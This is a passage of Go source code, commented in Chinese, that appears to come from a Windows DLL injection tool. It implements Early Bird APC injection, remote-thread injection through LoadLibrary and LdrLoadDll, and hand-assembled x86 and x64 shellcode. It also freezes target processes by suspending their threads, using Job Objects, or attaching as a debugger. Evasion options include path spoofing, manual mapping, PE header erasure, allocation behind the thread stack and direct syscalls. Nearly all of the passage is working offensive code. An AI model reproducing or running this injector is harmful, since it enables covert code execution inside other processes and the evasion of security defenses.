		remoteDllPath)

	if r1 == 0 {
		windows.TerminateProcess(pi.Process, 1)
		return errors.New("Failed to queue APC: " + err.Error())
	}

	i.logger.Info("Successfully queued APC to main thread")

	// 恢复进程执行
	r2, err := windows.ResumeThread(pi.Thread)
	if r2 == ^uint32(0) {
		windows.TerminateProcess(pi.Process, 1)
		return errors.New("Failed to resume thread: " + err.Error())
	}

	i.logger.Info("Process resumed, Early Bird APC injection completed")

	// 等待一段时间让DLL加载
	time.Sleep(2 * time.Second)

	return nil
}

// earlyBirdMemoryInject 从内存执行早期鸟注入
func (i *Injector) earlyBirdMemoryInject(targetPath string, dllBytes []byte) error {
	i.logger.Info("Starting Early Bird memory injection", "target_path", targetPath, "dll_size", len(dllBytes))

	// 创建临时DLL文件
	tempDllPath, err := i.createTempDllFile(dllBytes)
	if err != nil {
		return fmt.Errorf("failed to create temporary DLL file: %v", err)
	}
	defer os.Remove(tempDllPath)

	// 使用磁盘注入方法，但使用临时文件
	return i.earlyBirdDiskInject(targetPath, tempDllPath)
}

// dllNotificationInject 使用DLL通知注入方法
func (i *Injector) dllNotificationInject() error {
	// 检查参数是否有效
	if err := i.checkDllPath(); err != nil {
		return err
	}

	if err := i.checkProcessID(); err != nil {
		return err
	}

	i.logger.Info("Starting DLL notification injection")

	// 打开目标进程
	hProcess, err := windows.OpenProcess(
		windows.PROCESS_CREATE_THREAD|
			windows.PROCESS_VM_OPERATION|
			windows.PROCESS_VM_WRITE|
			windows.PROCESS_VM_READ|
			windows.PROCESS_QUERY_INFORMATION,
		false, i.processID)
	if err != nil {
		errMsg := "Failed to open target process: " + err.Error()
		newErr := errors.New(errMsg)
		i.logger.Error("DLL notification injection failed", "error", newErr)
		return newErr
	}
	defer windows.CloseHandle(hProcess)

	// 尝试多种DLL加载方法
	methods := []struct {
		name string
		fn   func(windows.Handle) error
	}{
		{"LdrLoadDll", i.dllNotificationLdrLoadDll},
		{"LoadLibraryA", i.dllNotificationLoadLibraryA},
		{"LoadLibraryW", i.dllNotificationLoadLibraryW},
	}

	var lastErr error
	for _, method := range methods {
		i.logger.Info("Trying DLL notification injection method", "method", method.name)

		err := method.fn(hProcess)
		if err == nil {
			i.logger.Info("DLL notification injection successful", "method", method.name)
			return nil
		}

		i.logger.Warn("DLL notification method failed", "method", method.name, "error", err)
		lastErr = err
	}

	errMsg := "All DLL notification injection methods failed"
	if lastErr != nil {
		errMsg += ": " + lastErr.Error()
	}
	newErr := errors.New(errMsg)
	i.logger.Error("DLL notification injection failed", "error", newErr)
	return newErr
}

// dllNotificationLdrLoadDll 使用LdrLoadDll进行注入
func (i *Injector) dllNotificationLdrLoadDll(hProcess windows.Handle) error {
	// LdrLoadDll需要UNICODE_STRING参数
	// NTSTATUS LdrLoadDll(
	//   PWCHAR PathToFile,
	//   ULONG Flags,
	//   PUNICODE_STRING ModuleFileName,
	//   PHANDLE ModuleHandle
	// );

	// 将DLL路径转换为UTF16
	dllPathUTF16, err := windows.UTF16FromString(i.dllPath)
	if err != nil {
		return errors.New("Failed to convert DLL path to UTF16: " + err.Error())
	}

	// 创建UNICODE_STRING结构
	type UNICODE_STRING struct {
		Length        uint16
		MaximumLength uint16
		Buffer        uintptr
	}

	// 计算字符串长度（字节）
	strLenBytes := uint16(len(dllPathUTF16) * 2) // UTF16每个字符2字节

	// 在目标进程中分配内存存储UTF16字符串
	remoteStringBuffer, err := VirtualAllocEx(hProcess, 0, uintptr(strLenBytes),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		return errors.New("Failed to allocate memory for string buffer: " + err.Error())
	}
	defer VirtualFreeEx(hProcess, remoteStringBuffer, 0, windows.MEM_RELEASE)

	// 写入UTF16字符串到远程进程
	var bytesWritten uintptr
	err = WriteProcessMemory(hProcess, remoteStringBuffer,
		unsafe.Pointer(&dllPathUTF16[0]), uintptr(strLenBytes), &bytesWritten)
	if err != nil {
		return errors.New("Failed to write string buffer: " + err.Error())
	}

	// 创建UNICODE_STRING结构
	unicodeString := UNICODE_STRING{
		Length:        strLenBytes - 2, // 不包括NULL终止符
		MaximumLength: strLenBytes,
		Buffer:        remoteStringBuffer,
	}

	// 在目标进程中分配内存存储UNICODE_STRING
	remoteUnicodeString, err := VirtualAllocEx(hProcess, 0, unsafe.Sizeof(unicodeString),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		return errors.New("Failed to allocate memory for UNICODE_STRING: " + err.Error())
	}
	defer VirtualFreeEx(hProcess, remoteUnicodeString, 0, windows.MEM_RELEASE)

	// 写入UNICODE_STRING到远程进程
	err = WriteProcessMemory(hProcess, remoteUnicodeString,
		unsafe.Pointer(&unicodeString), unsafe.Sizeof(unicodeString), &bytesWritten)
	if err != nil {
		return errors.New("Failed to write UNICODE_STRING: " + err.Error())
	}

	// 分配内存存储模块句柄
	remoteModuleHandle, err := VirtualAllocEx(hProcess, 0, unsafe.Sizeof(uintptr(0)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		return errors.New("Failed to allocate memory for module handle: " + err.Error())
	}
	defer VirtualFreeEx(hProcess, remoteModuleHandle, 0, windows.MEM_RELEASE)

	// 创建调用LdrLoadDll的shellcode
	shellcode, err := i.createLdrLoadDllShellcode(remoteUnicodeString, remoteModuleHandle)
	if err != nil {
		return errors.New("Failed to create shellcode: " + err.Error())
	}

	// 在目标进程中分配内存存储shellcode
	remoteShellcode, err := VirtualAllocEx(hProcess, 0, uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		return errors.New("Failed to allocate memory for shellcode: " + err.Error())
	}
	defer VirtualFreeEx(hProcess, remoteShellcode, 0, windows.MEM_RELEASE)

	// 写入shellcode到远程进程
	err = WriteProcessMemory(hProcess, remoteShellcode,
		unsafe.Pointer(&shellcode[0]), uintptr(len(shellcode)), &bytesWritten)
	if err != nil {
		return errors.New("Failed to write shellcode: " + err.Error())
	}

	// 创建远程线程执行shellcode
	var threadID uint32
	threadHandle, err := CreateRemoteThread(hProcess, nil, 0, remoteShellcode, 0, 0, &threadID)
	if err != nil {
		return errors.New("Failed to create remote thread: " + err.Error())
	}
	defer windows.CloseHandle(threadHandle)

	i.logger.Info("Created remote thread for LdrLoadDll", "thread_id", threadID)

	// 等待线程执行完成
	windows.WaitForSingleObject(threadHandle, windows.INFINITE)

	// 获取线程退出码
	var exitCode uint32
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	getExitCodeThread := kernel32.NewProc("GetExitCodeThread")
	r1, _, err := getExitCodeThread.Call(
		uintptr(threadHandle),
		uintptr(unsafe.Pointer(&exitCode)))
	if r1 == 0 {
		return errors.New("Failed to get thread exit code: " + err.Error())
	}

	// 检查NTSTATUS返回值
	if exitCode != 0 {
		return fmt.Errorf("LdrLoadDll failed with NTSTATUS: 0x%X", exitCode)
	}

	i.logger.Info("LdrLoadDll injection completed successfully")
	return nil
}

// dllNotificationLoadLibraryA 使用LoadLibraryA进行注入
func (i *Injector) dllNotificationLoadLibraryA(hProcess windows.Handle) error {
	// 在目标进程中分配内存存储DLL路径
	dllPathBytes := append([]byte(i.dllPath), 0) // 添加NULL终止符
	dllPathSize := uintptr(len(dllPathBytes))

	remoteDllPath, err := VirtualAllocEx(hProcess, 0, dllPathSize,
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		return errors.New("Failed to allocate memory in target process: " + err.Error())
	}
	defer VirtualFreeEx(hProcess, remoteDllPath, 0, windows.MEM_RELEASE)

	// 写入DLL路径到远程进程内存
	var bytesWritten uintptr
	err = WriteProcessMemory(hProcess, remoteDllPath, unsafe.Pointer(&dllPathBytes[0]),
		dllPathSize, &bytesWritten)
	if err != nil {
		return errors.New("Failed to write DLL path to target process memory: " + err.Error())
	}

	// 获取LoadLibraryA地址
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	loadLibraryA := kernel32.NewProc("LoadLibraryA")
	loadLibraryAddr := loadLibraryA.Addr()

	// 创建远程线程执行LoadLibraryA
	var threadID uint32
	threadHandle, err := CreateRemoteThread(hProcess, nil, 0, loadLibraryAddr, remoteDllPath, 0, &threadID)
	if err != nil {
		return errors.New("Failed to create remote thread: " + err.Error())
	}
	defer windows.CloseHandle(threadHandle)

	i.logger.Info("Created remote thread for LoadLibraryA", "thread_id", threadID)

	// 等待线程执行完成
	windows.WaitForSingleObject(threadHandle, windows.INFINITE)

	// 获取线程退出码
	var exitCode uint32
	getExitCodeThread := kernel32.NewProc("GetExitCodeThread")
	r1, _, err := getExitCodeThread.Call(
		uintptr(threadHandle),
		uintptr(unsafe.Pointer(&exitCode)))
	if r1 == 0 {
		return errors.New("Failed to get thread exit code: " + err.Error())
	}

	if exitCode == 0 {
		return errors.New("LoadLibraryA returned NULL, DLL loading failed")
	}

	exitCodeStr := "0x" + strconv.FormatUint(uint64(exitCode), 16)
	i.logger.Info("LoadLibraryA injection completed successfully", "module_handle", exitCodeStr)
	return nil
}

// dllNotificationLoadLibraryW 使用LoadLibraryW进行注入
func (i *Injector) dllNotificationLoadLibraryW(hProcess windows.Handle) error {
	// 将DLL路径转换为UTF16
	dllPathUTF16, err := windows.UTF16FromString(i.dllPath)
	if err != nil {
		return errors.New("Failed to convert DLL path to UTF16: " + err.Error())
	}

	// 在目标进程中分配内存存储UTF16路径
	dllPathSize := uintptr(len(dllPathUTF16) * 2) // UTF16每个字符2字节

	remoteDllPath, err := VirtualAllocEx(hProcess, 0, dllPathSize,
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		return errors.New("Failed to allocate memory in target process: " + err.Error())
	}
	defer VirtualFreeEx(hProcess, remoteDllPath, 0, windows.MEM_RELEASE)

	// 写入UTF16路径到远程进程内存
	var bytesWritten uintptr
	err = WriteProcessMemory(hProcess, remoteDllPath, unsafe.Pointer(&dllPathUTF16[0]),
		dllPathSize, &bytesWritten)
	if err != nil {
		return errors.New("Failed to write DLL path to target process memory: " + err.Error())
	}

	// 获取LoadLibraryW地址
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	loadLibraryW := kernel32.NewProc("LoadLibraryW")
	loadLibraryAddr := loadLibraryW.Addr()

	// 创建远程线程执行LoadLibraryW
	var threadID uint32
	threadHandle, err := CreateRemoteThread(hProcess, nil, 0, loadLibraryAddr, remoteDllPath, 0, &threadID)
	if err != nil {
		return errors.New("Failed to create remote thread: " + err.Error())
	}
	defer windows.CloseHandle(threadHandle)

	i.logger.Info("Created remote thread for LoadLibraryW", "thread_id", threadID)

	// 等待线程执行完成
	windows.WaitForSingleObject(threadHandle, windows.INFINITE)

	// 获取线程退出码
	var exitCode uint32
	getExitCodeThread := kernel32.NewProc("GetExitCodeThread")
	r1, _, err := getExitCodeThread.Call(
		uintptr(threadHandle),
		uintptr(unsafe.Pointer(&exitCode)))
	if r1 == 0 {
		return errors.New("Failed to get thread exit code: " + err.Error())
	}

	if exitCode == 0 {
		return errors.New("LoadLibraryW returned NULL, DLL loading failed")
	}

	exitCodeStr := "0x" + strconv.FormatUint(uint64(exitCode), 16)
	i.logger.Info("LoadLibraryW injection completed successfully", "module_handle", exitCodeStr)
	return nil
}

// createLdrLoadDllShellcode 创建调用LdrLoadDll的shellcode
func (i *Injector) createLdrLoadDllShellcode(unicodeStringAddr, moduleHandleAddr uintptr) ([]byte, error) {
	// 获取LdrLoadDll地址
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	ldrLoadDll := ntdll.NewProc("LdrLoadDll")
	ldrLoadDllAddr := ldrLoadDll.Addr()

	// 为了简化，我们使用一个通用的shellcode模板
	// 这个shellcode会调用LdrLoadDll并返回NTSTATUS

	// 检查系统架构
	if unsafe.Sizeof(uintptr(0)) == 8 {
		// 64位shellcode
		return i.createLdrLoadDllShellcode64(ldrLoadDllAddr, unicodeStringAddr, moduleHandleAddr)
	} else {
		// 32位shellcode
		return i.createLdrLoadDllShellcode32(ldrLoadDllAddr, unicodeStringAddr, moduleHandleAddr)
	}
}

// createLdrLoadDllShellcode64 创建64位LdrLoadDll shellcode
func (i *Injector) createLdrLoadDllShellcode64(ldrLoadDllAddr, unicodeStringAddr, moduleHandleAddr uintptr) ([]byte, error) {
	// 64位调用约定：RCX, RDX, R8, R9, 然后是栈参数
	// LdrLoadDll(PathToFile, Flags, ModuleFileName, ModuleHandle)
	// RCX = NULL (PathToFile)
	// RDX = 0 (Flags)
	// R8 = unicodeStringAddr (ModuleFileName)
	// R9 = moduleHandleAddr (ModuleHandle)

	shellcode := []byte{
		// 保存寄存器
		0x48, 0x83, 0xEC, 0x28, // sub rsp, 0x28 (shadow space)

		// 设置参数
		0x48, 0x31, 0xC9, // xor rcx, rcx (PathToFile = NULL)
		0x48, 0x31, 0xD2, // xor rdx, rdx (Flags = 0)
		0x49, 0xB8, // mov r8, unicodeStringAddr
	}

	// 添加unicodeStringAddr (8字节)
	unicodeStringBytes := make([]byte, 8)
	*(*uintptr)(unsafe.Pointer(&unicodeStringBytes[0])) = unicodeStringAddr
	shellcode = append(shellcode, unicodeStringBytes...)

	shellcode = append(shellcode, []byte{
		0x49, 0xB9, // mov r9, moduleHandleAddr
	}...)

	// 添加moduleHandleAddr (8字节)
	moduleHandleBytes := make([]byte, 8)
	*(*uintptr)(unsafe.Pointer(&moduleHandleBytes[0])) = moduleHandleAddr
	shellcode = append(shellcode, moduleHandleBytes...)

	shellcode = append(shellcode, []byte{
		// 调用LdrLoadDll
		0x48, 0xB8, // mov rax, ldrLoadDllAddr
	}...)

	// 添加ldrLoadDllAddr (8字节)
	ldrLoadDllBytes := make([]byte, 8)
	*(*uintptr)(unsafe.Pointer(&ldrLoadDllBytes[0])) = ldrLoadDllAddr
	shellcode = append(shellcode, ldrLoadDllBytes...)

	shellcode = append(shellcode, []byte{
		0xFF, 0xD0, // call rax

		// 恢复栈并返回
		0x48, 0x83, 0xC4, 0x28, // add rsp, 0x28
		0xC3, // ret
	}...)

	return shellcode, nil
}

// createLdrLoadDllShellcode32 创建32位LdrLoadDll shellcode
func (i *Injector) createLdrLoadDllShellcode32(ldrLoadDllAddr, unicodeStringAddr, moduleHandleAddr uintptr) ([]byte, error) {
	// 32位调用约定：参数从右到左压栈
	// LdrLoadDll(PathToFile, Flags, ModuleFileName, ModuleHandle)

	shellcode := []byte{
		// 保存寄存器
		0x55,       // push ebp
		0x89, 0xE5, // mov ebp, esp

		// 压栈参数（从右到左）
		0x68, // push moduleHandleAddr
	}

	// 添加moduleHandleAddr (4字节)
	moduleHandleBytes := make([]byte, 4)
	*(*uint32)(unsafe.Pointer(&moduleHandleBytes[0])) = uint32(moduleHandleAddr)
	shellcode = append(shellcode, moduleHandleBytes...)

	shellcode = append(shellcode, []byte{
		0x68, // push unicodeStringAddr
	}...)

	// 添加unicodeStringAddr (4字节)
	unicodeStringBytes := make([]byte, 4)
	*(*uint32)(unsafe.Pointer(&unicodeStringBytes[0])) = uint32(unicodeStringAddr)
	shellcode = append(shellcode, unicodeStringBytes...)

	shellcode = append(shellcode, []byte{
		0x6A, 0x00, // push 0 (Flags)
		0x6A, 0x00, // push 0 (PathToFile = NULL)

		// 调用LdrLoadDll
		0xB8, // mov eax, ldrLoadDllAddr
	}...)

	// 添加ldrLoadDllAddr (4字节)
	ldrLoadDllBytes := make([]byte, 4)
	*(*uint32)(unsafe.Pointer(&ldrLoadDllBytes[0])) = uint32(ldrLoadDllAddr)
	shellcode = append(shellcode, ldrLoadDllBytes...)

	shellcode = append(shellcode, []byte{
		0xFF, 0xD0, // call eax

		// 清理栈
		0x83, 0xC4, 0x10, // add esp, 0x10 (4 parameters * 4 bytes)

		// 恢复寄存器并返回
		0x89, 0xEC, // mov esp, ebp
		0x5D, // pop ebp
		0xC3, // ret
	}...)

	return shellcode, nil
}

// cryoBirdInject 使用Job Object冻结进程注入方法
func (i *Injector) cryoBirdInject() error {
	// 检查参数是否有效
	if err := i.checkDllPath(); err != nil {
		return err
	}

	if err := i.checkProcessID(); err != nil {
		return err
	}

	// 使用高级冷冻进程注入方法
	i.logger.Info("Using Job Object freeze process injection")
	return i.cryoBirdInjectAdvanced()
}

// cryoBirdInjectAdvanced 使用Job Object冷冻进程的高级注入方法
func (i *Injector) cryoBirdInjectAdvanced() error {
	// 检查参数是否有效
	if err := i.checkDllPath(); err != nil {
		return err
	}

	if err := i.checkProcessID(); err != nil {
		return err
	}

	i.logger.Info("Starting Job Object freeze process injection")

	// 确定DLL路径
	dllPath := i.dllPath
	if i.bypassOptions.PathSpoofing {
		dllPath = i.spoofDllPath()
		defer func() {
			if dllPath != i.dllPath {
				os.Remove(dllPath)
			}
		}()
	}

	// 尝试多种冷冻注入方法
	methods := []struct {
		name string
		fn   func(string) error
	}{
		{"ProcessSuspension", i.cryoBirdSuspensionInject},
		{"JobObjectFreeze", i.cryoBirdJobObjectInject},
		{"ThreadSuspension", i.cryoBirdThreadSuspensionInject},
	}

	var lastErr error
	for _, method := range methods {
		i.logger.Info("Trying CryoBird injection method", "method", method.name)

		err := method.fn(dllPath)
		if err == nil {
			i.logger.Info("CryoBird injection successful", "method", method.name)
			return nil
		}

		i.logger.Warn("CryoBird method failed", "method", method.name, "error", err)
		lastErr = err
	}

	errMsg := "All CryoBird injection methods failed"
	if lastErr != nil {
		errMsg += ": " + lastErr.Error()
	}
	newErr := errors.New(errMsg)
	i.logger.Error("CryoBird injection failed", "error", newErr)
	return newErr
}

// cryoBirdSuspensionInject 使用进程挂起的冷冻注入
func (i *Injector) cryoBirdSuspensionInject(dllPath string) error {
	i.logger.Info("Starting process suspension injection")

	// 1. 打开目标进程
	hProcess, err := windows.OpenProcess(
		windows.PROCESS_ALL_ACCESS,
		false, i.processID)
	if err != nil {
		return errors.New("Failed to open target process: " + err.Error())
	}
	defer windows.CloseHandle(hProcess)

	// 2. 挂起进程中的所有线程
	threadIDs, err := i.getAllThreads(i.processID)
	if err != nil {
		return errors.New("Failed to enumerate threads: " + err.Error())
	}

	if len(threadIDs) == 0 {
		return errors.New("No threads found in target process")
	}

	i.logger.Info("Found threads to suspend", "count", len(threadIDs))

	// 挂起所有线程
	var suspendedThreads []windows.Handle
	var suspendedCount int

	for _, threadID := range threadIDs {
		hThread, err := windows.OpenThread(windows.THREAD_SUSPEND_RESUME, false, threadID)
		if err != nil {
			i.logger.Warn("Failed to open thread", "thread_id", threadID, "error", err)
			continue
		}

		kernel32 := windows.NewLazySystemDLL("kernel32.dll")
		suspendThread := kernel32.NewProc("SuspendThread")

		r1, _, _ := suspendThread.Call(uintptr(hThread))
		if r1 != ^uintptr(0) { // 成功挂起
			suspendedThreads = append(suspendedThreads, hThread)
			suspendedCount++
			i.logger.Debug("Thread suspended", "thread_id", threadID)
		} else {
			windows.CloseHandle(hThread)
			i.logger.Warn("Failed to suspend thread", "thread_id", threadID)
		}
	}

	if suspendedCount == 0 {
		return errors.New("Failed to suspend any threads")
	}

	i.logger.Info("Process frozen by thread suspension", "suspended_threads", suspendedCount)

	// 确保在函数结束时恢复所有线程
	defer func() {
		i.logger.Info("Resuming suspended threads")
		kernel32 := windows.NewLazySystemDLL("kernel32.dll")
		resumeThread := kernel32.NewProc("ResumeThread")

		for _, hThread := range suspendedThreads {
			resumeThread.Call(uintptr(hThread))
			windows.CloseHandle(hThread)
		}
		i.logger.Info("All threads resumed")
	}()

	// 3. 在冻结状态下注入DLL
	err = i.performInjectionWhileFrozen(hProcess, dllPath)
	if err != nil {
		return errors.New("Failed to inject DLL while process frozen: " + err.Error())
	}

	i.logger.Info("Process suspension injection completed successfully")
	return nil
}

// cryoBirdJobObjectInject 使用Job Object的冷冻注入
func (i *Injector) cryoBirdJobObjectInject(dllPath string) error {
	i.logger.Info("Starting Job Object freeze injection")

	// 1. 打开目标进程
	hProcess, err := windows.OpenProcess(
		windows.PROCESS_ALL_ACCESS,
		false, i.processID)
	if err != nil {
		return errors.New("Failed to open target process: " + err.Error())
	}
	defer windows.CloseHandle(hProcess)

	// 2. 创建Job Object
	hJob, err := windows.CreateJobObject(nil, nil) // 使用匿名Job Object
	if err != nil {
		return errors.New("Failed to create Job Object: " + err.Error())
	}
	defer windows.CloseHandle(hJob)

	// 3. 设置Job Object限制
	jobLimits := windows.JOBOBJECT_EXTENDED_LIMIT_INFORMATION{
		BasicLimitInformation: windows.JOBOBJECT_BASIC_LIMIT_INFORMATION{
			LimitFlags: 0x00002000, // JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE
		},
	}

	_, err = windows.SetInformationJobObject(
		hJob,
		windows.JobObjectExtendedLimitInformation,
		uintptr(unsafe.Pointer(&jobLimits)),
		uint32(unsafe.Sizeof(jobLimits)),
	)
	if err != nil {
		return errors.New("Failed to set Job Object information: " + err.Error())
	}

	// 4. 将进程分配到Job Object
	if err = windows.AssignProcessToJobObject(hJob, hProcess); err != nil {
		return errors.New("Failed to assign process to Job Object: " + err.Error())
	}

	i.logger.Info("Process assigned to Job Object")

	// 5. 尝试冻结进程（使用多种方法）
	frozen := false

	// 方法1: 使用NtSuspendProcess
	if !frozen {
		frozen = i.tryNtSuspendProcess(hProcess)
	}

	// 方法2: 使用DebugActiveProcess
	if !frozen {
		frozen = i.tryDebugActiveProcess()
	}

	// 方法3: 使用线程挂起作为备用
	if !frozen {
		i.logger.Info("Falling back to thread suspension")
		return i.cryoBirdSuspensionInject(dllPath)
	}

	i.logger.Info("Process successfully frozen")

	// 确保在函数结束时解冻进程
	defer func() {
		i.logger.Info("Unfreezing process")
		i.unfreezeProcess(hProcess)
	}()

	// 6. 在冻结状态下注入DLL
	err = i.performInjectionWhileFrozen(hProcess, dllPath)
	if err != nil {
		return errors.New("Failed to inject DLL while process frozen: " + err.Error())
	}

	i.logger.Info("Job Object freeze injection completed successfully")
	return nil
}

// cryoBirdThreadSuspensionInject 使用线程级别挂起的冷冻注入
func (i *Injector) cryoBirdThreadSuspensionInject(dllPath string) error {
	i.logger.Info("Starting thread-level suspension injection")

	// 1. 打开目标进程
	hProcess, err := windows.OpenProcess(
		windows.PROCESS_ALL_ACCESS,
		false, i.processID)
	if err != nil {
		return errors.New("Failed to open target process: " + err.Error())
	}
	defer windows.CloseHandle(hProcess)

	// 2. 获取主线程
	mainThreadID, err := i.getMainThreadID(i.processID)
	if err != nil {
		return errors.New("Failed to get main thread: " + err.Error())
	}

	// 3. 挂起主线程
	hMainThread, err := windows.OpenThread(windows.THREAD_SUSPEND_RESUME, false, mainThreadID)
	if err != nil {
		return errors.New("Failed to open main thread: " + err.Error())
	}
	defer windows.CloseHandle(hMainThread)

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	suspendThread := kernel32.NewProc("SuspendThread")
	resumeThread := kernel32.NewProc("ResumeThread")

	r1, _, _ := suspendThread.Call(uintptr(hMainThread))
	if r1 == ^uintptr(0) {
		return errors.New("Failed to suspend main thread")
	}

	i.logger.Info("Main thread suspended")

	// 确保在函数结束时恢复主线程
	defer func() {
		i.logger.Info("Resuming main thread")
		resumeThread.Call(uintptr(hMainThread))
	}()

	// 4. 在主线程挂起状态下注入DLL
	err = i.performInjectionWhileFrozen(hProcess, dllPath)
	if err != nil {
		return errors.New("Failed to inject DLL while main thread suspended: " + err.Error())
	}

	i.logger.Info("Thread suspension injection completed successfully")
	return nil
}

// getAllThreads 获取进程的所有线程ID
func (i *Injector) getAllThreads(processID uint32) ([]uint32, error) {
	// 创建线程快照
	hSnapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return nil, errors.New("Failed to create thread snapshot: " + err.Error())
	}
	defer windows.CloseHandle(hSnapshot)

	// 遍历线程
	var te windows.ThreadEntry32
	te.Size = uint32(unsafe.Sizeof(te))
	err = windows.Thread32First(hSnapshot, &te)
	if err != nil {
		return nil, errors.New("Failed to get first thread: " + err.Error())
	}

	var threadIDs []uint32
	for {
		if te.OwnerProcessID == processID {
			threadIDs = append(threadIDs, te.ThreadID)
		}

		// 获取下一个线程
		err = windows.Thread32Next(hSnapshot, &te)
		if err != nil {
			if err == windows.ERROR_NO_MORE_FILES {
				break
			}
			return nil, errors.New("Failed to enumerate threads: " + err.Error())
		}
	}

	return threadIDs, nil
}

// tryNtSuspendProcess 尝试使用NtSuspendProcess挂起进程
func (i *Injector) tryNtSuspendProcess(hProcess windows.Handle) bool {
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	ntSuspendProcess := ntdll.NewProc("NtSuspendProcess")

	r1, _, _ := ntSuspendProcess.Call(uintptr(hProcess))
	if r1 == 0 {
		i.logger.Info("Process suspended using NtSuspendProcess")
		return true
	}

	i.logger.Warn("NtSuspendProcess failed", "ntstatus", fmt.Sprintf("0x%X", r1))
	return false
}

// tryDebugActiveProcess 尝试使用DebugActiveProcess附加调试器
func (i *Injector) tryDebugActiveProcess() bool {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	debugActiveProcess := kernel32.NewProc("DebugActiveProcess")

	r1, _, _ := debugActiveProcess.Call(uintptr(i.processID))
	if r1 != 0 {
		i.logger.Info("Process frozen using DebugActiveProcess")
		return true
	}

	i.logger.Warn("DebugActiveProcess failed")
	return false
}

// unfreezeProcess 解冻进程
func (i *Injector) unfreezeProcess(hProcess windows.Handle) {
	// 尝试多种解冻方法

	// 方法1: 使用NtResumeProcess
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	ntResumeProcess := ntdll.NewProc("NtResumeProcess")

	r1, _, _ := ntResumeProcess.Call(uintptr(hProcess))
	if r1 == 0 {
		i.logger.Info("Process resumed using NtResumeProcess")
		return
	}

	// 方法2: 使用DebugActiveProcessStop
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	debugActiveProcessStop := kernel32.NewProc("DebugActiveProcessStop")

	r2, _, _ := debugActiveProcessStop.Call(uintptr(i.processID))
	if r2 != 0 {
		i.logger.Info("Process unfrozen using DebugActiveProcessStop")
		return
	}

	i.logger.Warn("Failed to unfreeze process using standard methods")
}

// performInjectionWhileFrozen 在进程冻结状态下执行注入
func (i *Injector) performInjectionWhileFrozen(hProcess windows.Handle, dllPath string) error {
	i.logger.Info("Performing injection while process is frozen")

	// 根据选项决定使用内存加载还是磁盘加载
	if i.bypassOptions.MemoryLoad {
		// 内存加载
		dllBytes, err := os.ReadFile(dllPath)
		if err != nil {
			return errors.New("Failed to read DLL file: " + err.Error())
		}

		// 手动映射
		if i.bypassOptions.ManualMapping {
			// 创建bypass选项
			options := BypassOptions{
				InvisibleMemory: i.bypassOptions.InvisibleMemory,
				ErasePEHeader:   i.bypassOptions.ErasePEHeader,
				EraseEntryPoint: i.bypassOptions.EraseEntryPoint,
			}
			if err := ManualMapDLL(i.processID, dllBytes, options); err != nil {
				return errors.New("Manual mapping DLL failed: " + err.Error())
			}
		} else {
			// 内存加载
			return i.performMemoryInjection(hProcess, dllBytes)
		}
	} else {
		// 磁盘加载
		return i.performDiskInjection(hProcess, dllPath)
	}

	return nil
}

// performMemoryInjection 执行内存注入
func (i *Injector) performMemoryInjection(hProcess windows.Handle, dllBytes []byte) error {
	// 创建临时DLL文件
	tempDllPath, err := i.createTempDllFile(dllBytes)
	if err != nil {
		return fmt.Errorf("failed to create temporary DLL file: %v", err)
	}
	defer os.Remove(tempDllPath)

	return i.performDiskInjection(hProcess, tempDllPath)
}

// performDiskInjection 执行磁盘注入
func (i *Injector) performDiskInjection(hProcess windows.Handle, dllPath string) error {
	// 分配内存用于DLL路径
	dllPathBytes := []byte(dllPath + "\x00")
	var pathAddr uintptr
	var bytesWritten uintptr
	var err error

	// 如果使用线程栈后分配
	if i.bypassOptions.AllocBehindThreadStack {
		pathAddr, err = allocateBehindThreadStack(hProcess, uintptr(len(dllPathBytes)))
		if err != nil {
			// 回退到标准分配
			pathAddr, err = VirtualAllocEx(hProcess, 0, uintptr(len(dllPathBytes)),
				windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
			if err != nil {
				return errors.New("Failed to allocate memory: " + err.Error())
			}
		}
	} else {
		// 标准内存分配
		pathAddr, err = VirtualAllocEx(hProcess, 0, uintptr(len(dllPathBytes)),
			windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
		if err != nil {
			return errors.New("Failed to allocate memory: " + err.Error())
		}
	}

	// 写入DLL路径
	err = WriteProcessMemory(hProcess, pathAddr, unsafe.Pointer(&dllPathBytes[0]),
		uintptr(len(dllPathBytes)), &bytesWritten)
	if err != nil {
		return errors.New("Failed to write DLL path: " + err.Error())
	}

	// 获取函数地址
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	var threadStartAddr uintptr

	if i.bypassOptions.DirectSyscalls {
		// 使用LdrLoadDll而不是LoadLibrary
		ntdll := windows.NewLazySystemDLL("ntdll.dll")
		ldrLoadDll := ntdll.NewProc("LdrLoadDll")
		threadStartAddr = ldrLoadDll.Addr()
	} else {
		// 使用LoadLibrary
		loadLibraryA := kernel32.NewProc("LoadLibraryA")
		threadStartAddr = loadLibraryA.Addr()
	}

	// 创建远程线程
	var threadHandle windows.Handle
	if i.bypassOptions.DirectSyscalls {
		// 使用直接系统调用创建线程
		threadHandle, err = ntCreateThreadEx(hProcess, threadStartAddr, pathAddr)
	} else {
		// 使用标准API创建线程
		threadHandle, err = CreateRemoteThread(hProcess, nil, 0,
			threadStartAddr, pathAddr, 0, nil)
	}

	if err != nil {
		return errors.New("Failed to create remote thread: " + err.Error())
	}
	defer windows.CloseHandle(threadHandle)

	// 等待线程完成
	_, err = windows.WaitForSingleObject(threadHandle, windows.INFINITE)
	if err != nil {
